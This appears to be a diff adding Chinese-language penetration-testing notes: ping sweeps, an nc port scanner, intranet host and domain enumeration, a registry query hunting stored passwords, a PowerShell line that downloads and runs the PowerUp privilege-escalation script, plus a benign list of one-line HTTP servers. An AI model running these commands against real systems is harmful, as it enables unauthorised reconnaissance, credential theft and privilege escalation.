@@ -1,0 +1,170 @@
+一条命令揪出ssh登录者物理地址
+for i in `grep 'sshd' /var/log/auth.log* |grep 'Accepted' |grep ftp| grep -oE  '\<([1-9]|[1-9][0-9]|1[0-9]{2}|2[01][0-9]|22[0-3])\>(\.\<([0-9]|[0-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\>){2}\.\<([1-9]|[0-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-4])\>' | sort  | uniq`; do curl  -s --header "X-Forwarded-For: $i" http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P '(?<=\<center\>您的IP是：).*(?=<\/center)' ; done
+此条命令可获取所有存储在注册表中包含密码的键值
+REG query HKCU  /v "pwd" /s  #pwd可替换为password \ HKCU 可替换为HKCR
+powerup.ps1用于进行提权检测，这个脚本会查找 所在服务器的 服务 ，dll ,第三方等 可提权的漏洞信息
+powershell  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks
+
+
+
+1、扫描存活主机脚本
+使用方法 ./xxx.sh 192.168.10 > IP
+
+is_alive_ping()
+{
+  ping -c 1 $1 > /dev/null
+  [ $? -eq 0 ] && echo $i
+}
+read -p "IP[1.2.3]" IP
+for i in $IP.{1..254} 
+do
+is_alive_ping $i & disown
+done
+
+2.端口扫描脚本
+使用方法是直接运行该python程序， 比如保存为test.py ，直接运行 python test.py ，不过前提是你需要有IP文件，即就是第一步中你用shell脚本生成的IP列表
+
+import threading,os,time
+def ncDetect(IP):
+    command = "nc -v -z " + IP +" 21-9000 2>&1| grep succeed"
+    f = os.system(command)
+    
+
+IPHandle = open("IP","r")
+test = IPHandle.readline()
+test = test.strip('\n')
+while test:
+    for i in range(5):
+        t = threading.Thread(target=ncDetect,args=(test,))
+        t.start()
+        test = IPHandle.readline()
+        test = test.strip('\n')
+    time.sleep(5)
+    test = IPHandle.readline()
+    test = test.strip('\n')
+exit(0)
+
+
+很简单的小技巧，分享给搞内网的同志
+
+内网C段存活主机查找，这条来自核大很早以前的回帖
+
+for /l %i in (1,1,255) do @ping 10.0.1.%i -w 1 -n 1 | find /i "ttl"
+
+通过上面一条，加上我在内网玩的经验，延伸出了下面这条，是用来找主机名的
+
+for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i "Pinging"
+
+再从上面一条，延伸出了B段查找，因为在一个内网里面有时候不一定只有一个域，而当两个域没有信任时，可以用这条扫出来
+
+for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i "Pinging"
+
+这条也是核攻击大牛发的，是用来找域机器对应IP的
+
+FOR /F "eol=- tokens=1 delims=\ " %a IN ('net view') DO @(echo name: %a, ip: & ping %a -w 1 -n 1 | find /i "ttl" & echo.)
+
+时代在进步，IPV6越来越多了，那位牛来科普下IPV6的知识，应该可以延伸出更多的命令出来
+
+其实这些对于大牛来说只是些命令的简单应用而已，希望有更多实用命令被分享出来，更加利于我们渗透的学习与经验的增长
+
+各种脚本语言不同版本一句话开启 HTTP 服务器的总结
+Python 2.x
+
+$ python -m SimpleHTTPServer 8000
+
+Python 3.x
+
+$ python -m http.server 8000
+
+Twisted (Python)
+
+$ twistd -n web -p 8000 --path .
+
+Or：
+
+$ python -c 'from twisted.web.server import Site; from twisted.web.static import File; from twisted.internet import reactor; reactor.listenTCP(8000, Site(File("."))); reactor.run()'
+
+参见：Twisted.
+
+Ruby
+
+$ ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start'
+
+参见：Barking Iguana
+
+Ruby 1.9.2+
+
+$ ruby -run -ehttpd . -p8000
+
+参见：nobu
+
+adsf (Ruby)
+
+$ gem install adsf # install dependency
+$ adsf -p 8000
+
+参见：twome
+
+Sinatra (Ruby)
+
+$ gem install sinatra # install dependency
+$ ruby -rsinatra -e'set :public_folder, "."; set :port, 8000'
+
+Perl
+
+$ cpan HTTP::Server::Brick # install dependency
+$ perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>8000); $s->mount("/"=>{path=>"."}); $s->start'
+
+参见：Anonymous Monk
+
+Plack (Perl)
+
+$ cpan Plack # install dependency
+$ plackup -MPlack::App::Directory -e 'Plack::App::Directory->new(root=>".");' -p 8000
+
+参见: miyagawa
+
+Mojolicious (Perl)
+
+$ cpan Mojolicious::Lite # install dependency
+$ perl -MMojolicious::Lite -MCwd -e 'app->static->paths->[0]=getcwd; app->start' daemon -l http://*:8000
+
+http-server (Node.js)
+
+$ npm install -g http-server # install dependency
+$ http-server -p 8000
+
+node-static (Node.js)
+
+$ npm install -g node-static # install dependency
+$ static -p 8000
+
+PHP (>= 5.4)
+
+$ php -S 127.0.0.1:8000
+
+参见： /u/prawnsalad and MattLicense
+
+Erlang
+
+$ erl -s inets -eval 'inets:start(httpd,[{server_name,"NAME"},{document_root, "."},{server_root, "."},{port, 8000},{mime_types,[{"html","text/html"},{"htm","text/html"},{"js","text/javascript"},{"css","text/css"},{"gif","image/gif"},{"jpg","image/jpeg"},{"jpeg","image/jpeg"},{"png","image/png"}]}]).'
+
+参见：nivertech
+
+busybox httpd
+
+$ busybox httpd -f -p 8000
+
+参见：lvm
+
+webfs
+
+$ webfsd -F -p 8000
+
+参见：webfs.
+
+IIS Express
+
+C:\> "C:\Program Files (x86)\IIS Express\iisexpress.exe" /path:C:\MyWeb /port:8000
+
+参见：IIS Express and /u/fjantomen
